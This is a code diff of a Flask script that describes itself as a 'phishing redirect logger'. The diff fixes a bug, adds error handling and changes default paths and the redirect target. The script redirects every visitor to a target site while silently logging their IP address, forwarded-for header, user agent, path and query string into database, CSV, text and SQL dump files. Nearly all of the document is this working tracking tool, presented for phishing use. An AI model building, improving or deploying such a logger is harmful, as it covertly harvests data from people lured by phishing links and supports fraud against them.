@@ -5,13 +5,13 @@ sec.py - phishing redirect logger with multi-format outputs
 Behavior:
 - Redirects any incoming request to TARGET_URL (env var, default https://example.com)
 - Logs each visit into:
-  - SQLite DB (DB_FILE, default /data/logs.db)
-  - CSV file (CSV_FILE, default /data/logs.csv)
-  - TXT file (TXT_FILE, default /data/logs.txt)
-  - SQL dump file (SQL_FILE, default /data/logs.sql) — regenerated after each insert via connection.iterdump()
+  - SQLite DB (DB_FILE, default ./data/logs.db)
+  - CSV file (CSV_FILE, default ./data/logs.csv)
+  - TXT file (TXT_FILE, default ./data/logs.txt)
+  - SQL dump file (SQL_FILE, default ./data/logs.sql) — regenerated after each insert via connection.iterdump()
 - Healthcheck on /health
-- Configurable via env vars: TARGET_URL, DB_FILE, CSV_FILE, TXT_FILE, SQL_FILE, LISTEN_HOST, LISTEN_PORT
-- Designed to run locally or in Docker. Persist /data (or other path) as volume for logs persistence.
+- Configurable via env vars: TARGET_URL, LOG_DB, LOG_CSV, LOG_TXT, LOG_SQL, LISTEN_HOST, LISTEN_PORT
+- Designed to run locally or in Docker. Persist ./data (or other path) as volume for logs persistence.
 """
 from flask import Flask, request, redirect, abort, jsonify
 import os
@@ -21,12 +21,12 @@ from urllib.parse import urljoin, urlparse, urlunparse
 import csv
 import threading
 
-# Configuration (env override)
-DB_FILE = os.environ.get("LOG_DB", "/data/logs.db")
-CSV_FILE = os.environ.get("LOG_CSV", "/data/logs.csv")
-TXT_FILE = os.environ.get("LOG_TXT", "/data/logs.txt")
-SQL_FILE = os.environ.get("LOG_SQL", "/data/logs.sql")
-TARGET_URL = os.environ.get("TARGET_URL", "https://example.com")
+# Configuration (env override) — defaults changed to relative ./data for cross-platform convenience
+DB_FILE = os.environ.get("LOG_DB", "./data/logs.db")
+CSV_FILE = os.environ.get("LOG_CSV", "./data/logs.csv")
+TXT_FILE = os.environ.get("LOG_TXT", "./data/logs.txt")
+SQL_FILE = os.environ.get("LOG_SQL", "./data/logs.sql")
+TARGET_URL = os.environ.get("TARGET_URL", "https://google.com")
 LISTEN_HOST = os.environ.get("LISTEN_HOST", "0.0.0.0")
 LISTEN_PORT = int(os.environ.get("LISTEN_PORT", "8080"))
 
@@ -35,7 +35,11 @@ def ensure_parent_dirs(*paths):
     for p in paths:
         d = os.path.dirname(os.path.abspath(p))
         if d and not os.path.exists(d):
-            os.makedirs(d, exist_ok=True)
+            try:
+                os.makedirs(d, exist_ok=True)
+            except Exception:
+                # If directory creation fails, log and continue; will fail later on write with clearer error
+                print(f"Warning: could not create directory {d}, check permissions.")
 
 ensure_parent_dirs(DB_FILE, CSV_FILE, TXT_FILE, SQL_FILE)
 
@@ -45,8 +49,8 @@ _db_lock = threading.Lock()  # simple lock to reduce contention on sqlite + file
 def init_db():
     """Initialize sqlite database and create visits table if needed."""
     with _db_lock:
-        conn = sqlite3.connect(DB_FILE, timeout=10)
         try:
+            conn = sqlite3.connect(DB_FILE, timeout=10)
             conn.execute(
                 """
                 CREATE TABLE IF NOT EXISTS visits (
@@ -63,9 +67,14 @@ def init_db():
                 """
             )
             conn.commit()
+            print(f"Initialized DB at {DB_FILE}")
+        except Exception:
+            app.logger.exception("Failed to initialize DB")
         finally:
-            conn.close()
-
+            try:
+                conn.close()
+            except Exception:
+                pass
 
 def get_client_ip():
     """Return (ip, xff) honoring X-Forwarded-For if present."""
@@ -75,7 +84,6 @@ def get_client_ip():
         return first, xff
     return request.remote_addr, xff
 
-
 def safe_build_target(target_base, original_path, query_string):
     """Build target URL preserving path and query string."""
     parsed = urlparse(target_base)
@@ -83,13 +91,14 @@ def safe_build_target(target_base, original_path, query_string):
         target_base = "https://" + target_base
         parsed = urlparse(target_base)
 
-    combined = urljoin(target_base.rstrip("/) + /", original_path.lstrip("/"))
+    # Properly join base path and original path
+    # FIXED: use rstrip("/") with a single argument string and then add "/" correctly
+    combined = urljoin(target_base.rstrip("/") + "/", original_path.lstrip("/"))
     if query_string:
         p = urlparse(combined)
         new = p._replace(query=query_string)
         combined = urlunparse(new)
     return combined
-
 
 def append_txt(filepath, line):
     """Append a readable line to TXT log file."""
@@ -98,7 +107,6 @@ def append_txt(filepath, line):
             f.write(line + "\n")
     except Exception:
         app.logger.exception("Failed to write TXT log")
-
 
 def append_csv(filepath, fieldnames, row):
     """Append a row to CSV file, write header if file doesn't exist."""
@@ -112,9 +120,9 @@ def append_csv(filepath, fieldnames, row):
     except Exception:
         app.logger.exception("Failed to write CSV log")
 
-
 def dump_sql(filepath):
     """Dump whole sqlite database to SQL file using iterdump()."""
+    conn = None
     try:
         conn = sqlite3.connect(DB_FILE)
         with open(filepath, "w", encoding="utf-8") as f:
@@ -123,11 +131,8 @@ def dump_sql(filepath):
     except Exception:
         app.logger.exception("Failed to write SQL dump")
     finally:
-        try:
+        if conn:
             conn.close()
-        except Exception:
-            pass
-
 
 def log_visit(ip, xff, ua, host, path, qs, target):
     """Log visit into sqlite, txt, csv and generate sql dump."""
@@ -177,12 +182,9 @@ def log_visit(ip, xff, ua, host, path, qs, target):
         # SQL dump (regenerate)
         dump_sql(SQL_FILE)
 
-
 @app.route("/health", methods=["GET"])
-
 def health():
     return jsonify({"status": "ok"}), 200
-
 
 @app.route("/", defaults={"path": ""})
 @app.route("/<path:path>")
@@ -202,7 +204,6 @@ def catch_all(path):
         app.logger.exception("Logging failed")
 
     return redirect(target, code=302)
-
 
 if __name__ == "__main__":
     init_db()
